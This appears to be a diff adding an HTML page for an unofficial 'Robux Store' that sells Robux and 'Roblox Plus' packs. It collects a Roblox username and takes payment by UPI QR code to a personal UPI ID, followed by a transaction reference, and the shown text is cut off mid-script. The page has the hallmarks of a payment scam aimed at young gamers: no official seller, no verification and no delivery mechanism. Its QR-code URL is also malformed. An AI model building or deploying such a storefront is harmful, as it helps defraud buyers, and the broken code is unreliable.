@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robux Store</title>
+    <style>
+        body {
+            background-color: #0b1116;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            border: 2px solid #4bc2e3;
+            padding: 20px;
+            border-radius: 5px;
+        }
+        h1, h2 {
+            text-align: center;
+        }
+        .step {
+            margin-bottom: 30px;
+            border-bottom: 1px solid #223542;
+            padding-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type="text"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            color: #000;
+            font-size: 16px;
+        }
+        .tab-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .tab-btn {
+            padding: 10px 20px;
+            background-color: #1a2630;
+            color: white;
+            border: 2px solid #4bc2e3;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .tab-btn.active {
+            background-color: #4bc2e3;
+            color: #000;
+            font-weight: bold;
+        }
+        .package-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+        .package-card {
+            background-color: #15202b;
+            border: 1px solid #334455;
+            padding: 15px;
+            text-align: center;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .package-card:hover {
+            border-color: #4bc2e3;
+            background-color: #1a2c3d;
+        }
+        .package-card.selected {
+            border-color: #4bc2e3;
+            background-color: #4bc2e3;
+            color: #000;
+        }
+        .package-card h3 {
+            margin: 0 0 5px 0;
+        }
+        .package-card p {
+            margin: 0;
+            font-weight: bold;
+        }
+        .btn-submit {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background-color: #d100d1;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+        .btn-submit:hover {
+            background-color: #a000a0;
+        }
+        .copy-btn {
+            background-color: #f0f0f0;
+            color: #000;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            border: none;
+            font-weight: bold;
+        }
+        .qr-container {
+            text-align: center;
+            margin: 20px 0;
+            background: #fff;
+            padding: 15px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        .qr-image {
+            max-width: 200px;
+            width: 100%;
+        }
+        #paymentSection {
+            display: none;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>🎮 ROBUX STORE 🎮</h1>
+    <p style="text-align: center; color: #aaa;">Instant Robux & Roblox Plus Deliveries. Safe, reliable, and tailored for all gaming enthusiasts.</p>
+
+    <!-- Step 1 & 2: Username Info -->
+    <div class="step">
+        <h2>Step 1 & 2: Account Identification</h2>
+        <div class="input-group">
+            <label for="username">Roblox Username</label>
+            <input type="text" id="username" placeholder="Enter Roblox Username">
+        </div>
+        <div class="input-group">
+            <label for="confirm-username">Confirm Username</label>
+            <input type="text" id="confirm-username" placeholder="Confirm Roblox Username">
+        </div>
+    </div>
+
+    <!-- Step 4: Package Selection -->
+    <div class="step">
+        <h2>Step 4: Select Your Package</h2>
+        <div class="tab-buttons">
+            <button id="robuxTab" class="tab-btn active" onclick="switchTab('robux')">Robux Packs</button>
+            <button id="plusTab" class="tab-btn" onclick="switchTab('plus')">Roblox Plus ⭐</button>
+        </div>
+
+        <!-- Robux Packages Grid -->
+        <div id="robuxContainer" class="package-grid">
+            <div class="package-card" onclick="selectPackage(this, '400 Robux', '199')"><h3>400</h3><p>₹199</p></div>
+            <div class="package-card" onclick="selectPackage(this, '800 Robux', '499')"><h3>800</h3><p>₹499</p></div>
+            <div class="package-card" onclick="selectPackage(this, '1,200 Robux', '599')"><h3>1,200</h3><p>₹599</p></div>
+            <div class="package-card" onclick="selectPackage(this, '1,700 Robux', '799')"><h3>1,700</h3><p>₹799</p></div>
+            <div class="package-card" onclick="selectPackage(this, '3,150 Robux', '1199')"><h3>3,150</h3><p>₹1,199</p></div>
+            <div class="package-card" onclick="selectPackage(this, '4,500 Robux', '1999')"><h3>4,500</h3><p>₹1,999</p></div>
+            <div class="package-card" onclick="selectPackage(this, '10,000 Robux', '2999')"><h3>10,000</h3><p>₹2,999</p></div>
+        </div>
+
+        <!-- Roblox Plus Packages Grid -->
+        <div id="plusContainer" class="package-grid hidden">
+            <div class="package-card" onclick="selectPackage(this, 'Plus Monthly', '199')"><h3>Plus Monthly</h3><p>₹199/mo</p></div>
+            <div class="package-card" onclick="selectPackage(this, 'Plus 500', '399')"><h3>Plus 500</h3><p>₹399/mo</p></div>
+            <div class="package-card" onclick="selectPackage(this, 'Plus 1000', '999')"><h3>Plus 1000</h3><p>₹999/mo</p></div>
+            <div class="package-card" onclick="selectPackage(this, 'Plus 2000', '1499')"><h3>Plus 2000</h3><p>₹1,499/mo</p></div>
+        </div>
+    </div>
+
+    <!-- Step 5: Secure Payment Page -->
+    <div id="paymentSection" class="step" style="border-bottom: none; padding-bottom: 0;">
+        <h2>💳 Secure Gateway Payment</h2>
+        <div style="background-color: #15202b; padding: 15px; border-radius: 5px; margin-bottom: 20px; border: 1px dashed #4bc2e3;">
+            <p style="margin: 5px 0;"><strong>Selected Package:</strong> <span id="selectedProduct" style="color: #4bc2e3;">-</span></p>
+            <p style="margin: 5px 0;"><strong>Total Amount:</strong> <span id="totalAmount" style="color: #4bc2e3;">-</span></p>
+        </div>
+        
+        <div style="text-align: center;">
+            <div class="qr-container">
+                <img class="qr-image" id="qrCodeImage" src="" alt="UPI QR Code">
+            </div>
+            <p style="margin-top: 0; color: #aaa;">Scan to Pay via UPI</p>
+        </div>
+
+        <div class="input-group">
+            <label>UPI ID Reference</label>
+            <div style="display: flex; gap: 10px; align-items: center;">
+                <input type="text" value="naruka13@fam" id="upiId" readonly style="width: 75%;">
+                <button class="copy-btn" onclick="copyUpi()">Copy</button>
+            </div>
+            <p id="copySuccess" style="color: #4caf50; margin: 5px 0 0 0; display: none;">✓ UPI ID copied successfully!</p>
+        </div>
+
+        <div class="input-group">
+            <label for="utr">UTR / Transaction ID (12 Digits)</label>
+            <input type="text" id="utr" placeholder="Enter 12-digit UTR Code...">
+        </div>
+
+        <button class="btn-submit" onclick="submitForm()">Submit Payment</button>
+    </div>
+
+    <p style="text-align: center; margin-top: 20px; color: #4bc2e3;">⚡ Buy Robux Now ⚡</p>
+</div>
+
+<script>
+    function switchTab(type) {
+        if(type === 'robux') {
+            document.getElementById('robuxContainer').classList.remove('hidden');
+            document.getElementById('plusContainer').classList.add('hidden');
+            document.getElementById('robuxTab').classList.add('active');
+            document.getElementById('plusTab').classList.remove('active');
+        } else {
+            document.getElementById('robuxContainer').classList.add('hidden');
+            document.getElementById('plusContainer').classList.remove('hidden');
+            document.getElementById('plusTab').classList.add('active');
+            document.getElementById('robuxTab').classList.remove('active');
+        }
+    }
+
+    function selectPackage(element, name, price) {
+        const cards = document.querySelectorAll('.package-card');
+        cards.forEach(card => card.classList.remove('selected'));
+        
+        element.classList.add('selected');
+
+        document.getElementById('selectedProduct').innerText = name;
+        document.getElementById('totalAmount').innerText = '₹' + parseInt(price).toLocaleString('en-IN');
+        
+        const upiUrl = `upi://pay?pa=naruka13@fam&am=${price}&cu=INR`;
+        document.getElementById('qrCodeImage').src = `https://qrserver.com{encodeURIComponent(upiUrl)}`;
+
+        document.getElementById('paymentSection').style.display = 'block';
+        document.getElementById('paymentSection').scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function copyUpi() {
+        const upiInput = document.getElementById('upiId');
+        upiInput.select();
+        upiInput.setSelectionRange(0, 99999);
+        navigator.clipboard.writeText(upiInput.value);
+        
+        const successMessage = document.getElementById('copySuccess');
+        successMessage.style.display = 'block';
+        setTimeout(() => {
